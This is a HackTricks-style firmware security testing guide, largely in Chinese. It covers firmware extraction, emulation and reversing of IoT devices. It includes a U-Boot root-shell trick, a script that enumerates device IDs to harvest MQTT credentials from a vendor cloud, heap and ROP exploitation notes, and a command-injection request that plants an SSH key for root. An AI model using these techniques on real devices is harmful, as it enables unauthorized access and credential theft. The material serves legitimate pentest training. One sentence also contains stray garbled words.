# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Introduction**

### Related resources


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware 是一种关键软件，它通过管理并促进硬件组件与用户交互的软件之间的通信，使设备能够正常运行。它存储在永久存储器中，确保设备从一上电就能访问关键指令，从而启动 operating system。检查并在必要时修改 firmware，是识别安全漏洞的关键步骤。

## **Gathering Information**

**Gathering information** 是理解设备组成和所用技术的关键初始步骤。这个过程包括收集以下数据：

- CPU architecture 和其运行的 operating system
- Bootloader 细节
- 硬件布局和 datasheets
- Codebase 指标和 source 位置
- External libraries 和 license 类型
- Update 历史和监管认证
- Architecture 和 flow diagrams
- Security assessments 和已识别的漏洞

为此，**open-source intelligence (OSINT)** 工具非常有价值，任何可用的开源软件组件也应通过手动和自动化审查流程进行分析。像 [Coverity Scan](https://scan.coverity.com) 和 [Semmle’s LGTM](https://lgtm.com/#explore) 这样的工具提供免费的 static analysis，可用于发现潜在问题。

## **Acquiring the Firmware**

获取 firmware 可以通过多种方式进行，每种方式都有各自的复杂度：

- **Directly** from the source (developers, manufacturers)
- **Building** it from provided instructions
- **Downloading** from official support sites
- 利用 **Google dork** 查询查找托管的 firmware 文件
- 直接访问 **cloud storage**，使用像 [S3Scanner](https://github.com/sa7mon/S3Scanner) 这样的工具
- 通过 man-in-the-middle 技术拦截 **updates**
- 通过 **UART**、**JTAG** 或 **PICit** 之类的连接从设备中 **extracting**
- 在设备通信中 **sniffing** 更新请求
- 识别并使用硬编码的 update 端点
- 从 bootloader 或网络中 **dumping**
- 当别无他法时，使用合适的硬件工具**移除并读取**存储芯片

### UART-only logs: force a root shell via U-Boot env in flash

If UART RX is ignored (logs only), you can still force an init shell by **editing the U-Boot environment blob** offline:

1. Dump SPI flash with a SOIC-8 clip + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Locate the U-Boot env partition, edit `bootargs` to include `init=/bin/sh`, and **recompute the U-Boot env CRC32** for the blob.
3. Reflash only the env partition and reboot; a shell should appear on UART.

This is useful on embedded devices where the bootloader shell is disabled but the env partition is writable via external flash access.

## 分析 firmware

现在你已经**拥有 firmware**，你需要提取关于它的信息，以了解该如何处理它。你可以使用的不同工具：
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
如果你用那些工具没找到很多内容，就用 `binwalk -E <bin>` 检查图像的 **entropy**，如果 entropy 低，那么它不太可能是加密的。如果 entropy 高，说明它很可能是加密的（或者以某种方式被压缩了）。

另外，你可以用这些工具来提取 **嵌入在 firmware 中的文件**：


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

或者用 [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) 来检查该文件。

### 获取 Filesystem

使用前面提到的工具，比如 `binwalk -ev <bin>`，你应该已经能够 **提取 filesystem** 了。\
Binwalk 通常会把它提取到一个 **以 filesystem 类型命名的文件夹** 中，这个类型通常是以下之一：squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs。

#### 手动提取 Filesystem

有时，binwalk **不会在其签名中包含 filesystem 的 magic byte**。在这种情况下，使用 binwalk 来 **找到 filesystem 的偏移**，并从二进制中 **carve 出压缩后的 filesystem**，然后根据其类型，按照下面的步骤 **手动提取** filesystem。
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
运行以下 **dd command** 来提取 Squashfs 文件系统。
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
或者，也可以运行以下命令。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- 对于 squashfs（如上例所用）

`$ unsquashfs dir.squashfs`

之后文件会位于 "`squashfs-root`" 目录中。

- CPIO archive files

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- 对于 jffs2 filesystems

`$ jefferson rootfsfile.jffs2`

- 对于带有 NAND flash 的 ubifs filesystems

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## 分析 Firmware

一旦获得 Firmware，就必须对其进行剖析，以了解其结构和潜在漏洞。这个过程涉及使用各种工具来分析并从 Firmware 镜像中提取有价值的数据。

### 初始分析工具

这里提供了一组用于初步检查二进制文件（称为 `<bin>`）的命令。这些命令有助于识别文件类型、提取字符串、分析二进制数据，以及理解分区和文件系统细节：
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
为了评估镜像的加密状态，会使用 `binwalk -E <bin>` 检查 **entropy**。低 entropy 表明可能没有加密，而高 entropy 则表示可能存在加密或压缩。

对于提取 **embedded files**，建议使用 **file-data-carving-recovery-tools** 文档和 **binvis.io** 这类工具与资源进行文件检查。

### Extracting the Filesystem

使用 `binwalk -ev <bin>`，通常可以提取 filesystem，往往会放到一个以 filesystem 类型命名的目录中（例如，squashfs、ubifs）。不过，当 **binwalk** 因缺少 magic bytes 而无法识别 filesystem 类型时，就需要手动提取。这包括使用 `binwalk` 定位 filesystem 的 offset，然后用 `dd` 命令将 filesystem carve 出来：
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
之后，取决于 filesystem 类型（例如，squashfs、cpio、jffs2、ubifs），会使用不同的命令手动提取内容。

### Filesystem Analysis

在提取出 filesystem 后，就开始搜索 security flaws。重点关注不安全的 network daemons、hardcoded credentials、API endpoints、update server 功能、未编译代码、启动脚本以及用于离线分析的编译后二进制文件。

**需要检查的关键位置**和**项目**包括：

- **etc/shadow** 和 **etc/passwd** 中的用户凭据
- **etc/ssl** 中的 SSL certificates 和 keys
- 可能存在漏洞的配置文件和脚本文件
- 用于进一步分析的嵌入式 binaries
- 常见 IoT device web servers 和 binaries

有几个 tools 可帮助发现 filesystem 中的敏感信息和漏洞：

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) 和 [**Firmwalker**](https://github.com/craigz28/firmwalker) 用于搜索敏感信息
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) 用于全面的 firmware analysis
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer)、[**ByteSweep**](https://gitlab.com/bytesweep/bytesweep)、[**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) 和 [**EMBA**](https://github.com/e-m-b-a/emba) 用于 static 和 dynamic analysis

### Security Checks on Compiled Binaries

filesystem 中找到的源代码和编译后二进制文件都必须仔细检查漏洞。像 **checksec.sh** 这样的 Unix binaries 工具，以及用于 Windows binaries 的 **PESecurity**，有助于识别可被利用的未受保护 binaries。

## Harvesting cloud config and MQTT credentials via derived URL tokens

许多 IoT hubs 会从一个 cloud endpoint 获取每台设备的配置，其形式如下：

- `https://<api-host>/pf/<deviceId>/<token>`

在 firmware analysis 期间，你可能会发现 `<token>` 是通过硬编码的 secret，基于 device ID 在本地派生得到的，例如：

- token = MD5( deviceId || STATIC_KEY )，并以大写 hex 表示

这种设计使得任何知道 deviceId 和 STATIC_KEY 的人都可以重建 URL 并拉取 cloud config，往往会泄露明文 MQTT credentials 和 topic prefixes。

实际 workflow：

1) 从 UART boot logs 中提取 deviceId

- 连接一个 3.3V UART adapter（TX/RX/GND）并捕获 logs：
```bash
picocom -b 115200 /dev/ttyUSB0
```
- 查找打印 cloud config URL 模式和 broker 地址的行，例如：
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) 从 firmware 中恢复 STATIC_KEY 和 token 算法

- 将 binaries 加载到 Ghidra/radare2 中，并搜索 config path（"/pf/"）或 MD5 用法。
- 确认 algorithm（例如，MD5(deviceId||STATIC_KEY)）。
- 在 Bash 中推导 token，并将 digest 转为大写：
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) 收集 cloud config 和 MQTT credentials

- 使用 curl 组合 URL 并拉取 JSON；用 jq 解析以提取 secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) 滥用明文 MQTT 和弱 topic ACLs（如果存在）

- 使用恢复的凭据订阅 maintenance topics，并查找敏感事件：
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) 枚举可预测的设备 ID（在获得授权的前提下，规模化）

- 许多生态系统会将 vendor OUI/product/type 字节嵌入其中，后跟一个顺序后缀。
- 你可以迭代候选 ID，派生 tokens，并以编程方式获取 configs：
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notes
- 在尝试 mass enumeration 之前，始终先获得明确授权。
- 在可能的情况下，优先使用 emulation 或 static analysis 来恢复 secrets，而不要修改 target hardware。


emulating firmware 的过程可以实现 **dynamic analysis**，既可以针对设备的运行状态，也可以针对单个程序。这个方法可能会遇到 hardware 或 architecture 依赖方面的挑战，但将 root filesystem 或特定 binaries 转移到具有匹配 architecture 和 endianness 的设备上，例如 Raspberry Pi，或转移到预先构建的 virtual machine 中，可以促进进一步测试。

### Emulating Individual Binaries

对于检查单个程序，识别程序的 endianness 和 CPU architecture 至关重要。

#### Example with MIPS Architecture

要 emulating 一个 MIPS architecture binary，可以使用命令：
```bash
file ./squashfs-root/bin/busybox
```
并安装必要的 emulation tools：
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
对于 MIPS（big-endian），使用 `qemu-mips`，而对于 little-endian binaries，则应选择 `qemu-mipsel`。

#### ARM Architecture Emulation

对于 ARM binaries，流程类似，会使用 `qemu-arm` emulator 进行 emulation。

### Full System Emulation

像 [Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) 以及其他工具，都可以促进 full firmware emulation，自动化该过程并辅助动态分析。

## Dynamic Analysis in Practice

在这个阶段，会使用真实设备或 emulated 设备环境进行分析。关键是要保持对 OS 和 filesystem 的 shell access。Emulation 可能无法完全模拟 hardware interactions，因此有时需要重启 emulation。分析应重新查看 filesystem，利用暴露的 webpages 和 network services，并探索 bootloader vulnerabilities。Firmware integrity tests 对于识别潜在的 backdoor vulnerabilities 至关重要。

## Runtime Analysis Techniques

Runtime analysis 涉及在其运行环境中与 process 或 binary 交互，使用像 gdb-multiarch、Frida 和 Ghidra 这样的工具来设置 breakpoints，并通过 fuzzing 和其他技术识别 vulnerabilities。

对于没有完整 debugger 的 embedded targets，**将静态链接的 `gdbserver` 复制**到设备上并远程 attach：
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

在 IoT hubs 上，RF stack 通常在 **radio MCU** 和 Linux userland process 之间拆分。一个有用的 workflow 是映射这条路径：

1. 空中的 **RF frame**
2. radio MCU 上的 **controller-side parser**
3. 转发到 Linux 的 **serial/UART text or TLV protocol**（例如 `/dev/tty*`）
4. 主 daemon 中的 **application dispatcher**
5. **protocol-specific handler / state machine**

这种架构会产生两个 reversing target，而不是一个。如果 controller 把二进制 radio frames 转成类似 `Group,Command,arg1,arg2,...` 的文本协议，应该还原：

- **message groups** 和 dispatch tables
- 哪些消息可以来自 **network**，哪些来自 controller itself
- 精确的 **manufacturer-specific discriminator fields**（例如 Zigbee `manufacturer_code` 和 custom `cluster_command`）
- 哪些 handlers 只在 **commissioning**、discovery 或 firmware/model download phases 期间可达

就 Zigbee 而言，捕获 pairing traffic 并检查 target 是否仍依赖默认 **Link Key** `ZigBeeAlliance09`。如果是，嗅探 commissioning traffic 可能会暴露 **Network Key**。Zigbee 3.0 install codes 会降低这种暴露，因此要注意被测设备是否 वास्तव वास्तव enforced them。

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCL commands 往往比 standardized clusters 更值得作为 target，因为它们会进入 **custom parsing code** 和内部 **FSMs**，而这些逻辑通常没有那么充分的验证。

Practical workflow:

- 逆向 command dispatcher，直到找到 **vendor-only handler**。
- 还原 **FSM state**、**event**、**check**、**action** 和 **next-state** tables。
- 识别会自动前进的 **transitional states**，以及最终会 reset 或 free attacker-controlled state 的 retry/error branches。
- 不要默认 buggy handler 总是可达；先确认哪些合法 protocol exchanges 是把 daemon 置于 vulnerable state 所必需的。

对于 time-sensitive protocols，来自 Python framework 的 packet replay 可能太慢。更可靠的方法是在真实硬件上模拟合法 device（例如 **nRF52840**），并使用 vendor-grade stack，这样你可以暴露正确的 **endpoints**、**attributes** 和 commissioning timing。

### Fragmented-download bug class in embedded daemons

一种常见的 firmware bug class 出现在 **fragmented blob/model/configuration downloads** 中：

1. **first fragment**（`offset == 0`）会保存 `ctx->total_size` 并分配 `malloc(total_size)`。
2. 后续 fragments 只验证 attacker-controlled 的 **packet-local** fields，例如 `packet_total_size >= offset + chunk_len`。
3. 拷贝使用 `memcpy(&ctx->buffer[offset], chunk, chunk_len)`，却没有检查 **original allocated size**。

这使攻击者可以发送：

- 一个合法的 first fragment，声明的 total size **很小**，以强制分配一个小的 heap allocation。
- 一个后续 fragment，带有 **expected offset**，但 `chunk_len` 更大。
- 一个伪造的 packet-local size，满足新的检查，同时仍然溢出最初分配的 buffer。

当 vulnerable path 位于 commissioning logic 之后时，exploitation 必须包含足够的 **device emulation**，先把 target 驱动到预期的 model-download 或 blob-download state，再发送畸形 fragments。

### Protocol-driven `free()` triggers

在 embedded daemons 中，触发 heap metadata exploitation 最容易的方法往往不是“等清理”，而是 **强制 protocol 自己的 error handling**：

- 发送畸形的后续 fragments，把 FSM 推入 **retry** 或 **error** states。
- 超过 retry threshold，使 daemon **resets context** 并释放被破坏的 buffer。
- 利用这个可预测的 `free()`，在 process 因无关原因崩溃之前触发 allocator-side primitives。

这对 **musl/uClibc/dlmalloc-like** allocators 的 embedded Linux 尤其有用，因为破坏 chunk metadata 可能把 unlink/unbin logic 变成写原语。一个稳定的模式是破坏 **size field**，将 allocator traversal 重定向到 **fake chunks staged inside the overflowed buffer**，而不是立刻覆盖真实的 bin pointers 并让 process 崩溃。

## Binary Exploitation and Proof-of-Concept

为已识别漏洞开发 PoC 需要深入理解 target architecture 并使用低级语言编程。embedded systems 中的 binary runtime protections 很少见，但如果存在，可能需要 Return Oriented Programming (ROP) 等技术。

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc 使用与 glibc 类似的 fastbins。后续的大块分配可能触发 `__malloc_consolidate()`，因此任何 fake chunk 都必须通过检查（合理的 size、`fd = 0`，以及周围 chunks 被视为 "in use"）。
- **Non-PIE binaries under ASLR:** 如果启用了 ASLR 但主 binary 是 **non-PIE**，那么 binary 内部的 `.data/.bss` 地址是稳定的。你可以瞄准一个已经类似有效 heap chunk header 的区域，把 fastbin allocation 落到一个 **function pointer table** 上。
- **Parser-stopping NUL:** 当解析 JSON 时，payload 中的 `\x00` 可以停止 parsing，同时保留尾部 attacker-controlled bytes，用于 stack pivot/ROP chain。
- **Shellcode via `/proc/self/mem`:** 一个调用 `open("/proc/self/mem")`、`lseek()` 和 `write()` 的 ROP chain 可以把可执行 shellcode 放到已知 mapping 中，并跳转过去执行。

## Prepared Operating Systems for Firmware Analysis

像 [AttifyOS](https://github.com/adi0x90/attifyos) 和 [EmbedOS](https://github.com/scriptingxss/EmbedOS) 这样的 operating systems 提供了用于 firmware security testing 的预配置环境，并配备了必要的 tools。

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS 是一个旨在帮助你对 Internet of Things (IoT) devices 进行 security assessment 和 penetration testing 的 distro。它通过提供一个预配置环境并加载所有必要的 tools，为你节省大量时间。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): 基于 Ubuntu 18.04 的 embedded security testing operating system，预装了 firmware security testing tools。

## Firmware Downgrade Attacks & Insecure Update Mechanisms

即使 vendor 为 firmware images 实现了 cryptographic signature checks，**version rollback（downgrade） protection 经常被省略**。当 boot- 或 recovery-loader 只用 embedded public key 验证 signature，而不比较被刷入 image 的 *version*（或 monotonic counter）时，攻击者就可以合法地安装一个 **older, vulnerable firmware**，它仍然带有有效 signature，从而重新引入已修补的漏洞。

Typical attack workflow:

1. **Obtain an older signed image**
* 从 vendor 的 public download portal、CDN 或 support site 获取。
* 从 companion mobile/desktop applications 中提取（例如 Android APK 的 `assets/firmware/` 目录下）。
* 从 VirusTotal、internet archives、forums 等第三方 repositories 中获取。
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI、mobile-app API、USB、TFTP、MQTT 等。
* 许多 consumer IoT devices 暴露 *unauthenticated* HTTP(S) endpoints，接受 Base64-encoded firmware blobs，在 server-side 解码后触发 recovery/upgrade。
3. 降级后，利用在更新版本中已被修补的漏洞（例如后来加入的 command-injection filter）。
4. 可选地把最新 image 刷回去，或禁用 updates，以便在获得 persistence 后避免被发现。

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
在有漏洞的（降级后的）firmware 中，`md5` 参数会被直接拼接进 shell command，而没有经过 sanitisation，从而允许注入任意 commands（这里——启用基于 SSH key 的 root access）。后续 firmware 版本引入了一个基础的字符过滤器，但由于缺少 downgrade protection，这个修复也就失去了意义。

### 从 Mobile Apps 中提取 Firmware

许多 vendor 会把完整的 firmware images 打包到它们的 companion mobile applications 中，这样 app 就可以通过 Bluetooth/Wi-Fi 更新设备。这些包通常以未加密形式存放在 APK/APEX 中，例如 `assets/fw/` 或 `res/raw/` 路径下。使用 `apktool`、`ghidra`，甚至普通的 `unzip`，都可以提取 signed images，而无需接触物理 hardware。
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### 检查更新逻辑的清单

* 传输/认证 *update endpoint* 是否得到充分保护（TLS + authentication）？
* 设备在刷写前是否比较 **version numbers** 或 **monotonic anti-rollback counter**？
* image 是否在 secure boot chain 中被验证（例如由 ROM code 检查 signatures）？
* userland code 是否执行额外的合理性检查（例如允许的 partition map、model number）？
* *partial* 或 *backup* update flows 是否复用了相同的验证逻辑？

> 💡  如果以上任何一项缺失，platform 可能容易受到 rollback attacks。

## 可用于练习的 vulnerable firmware

为了练习发现 firmware 中的漏洞，可以使用以下 vulnerable firmware projects 作为起点。

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Trainning and Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
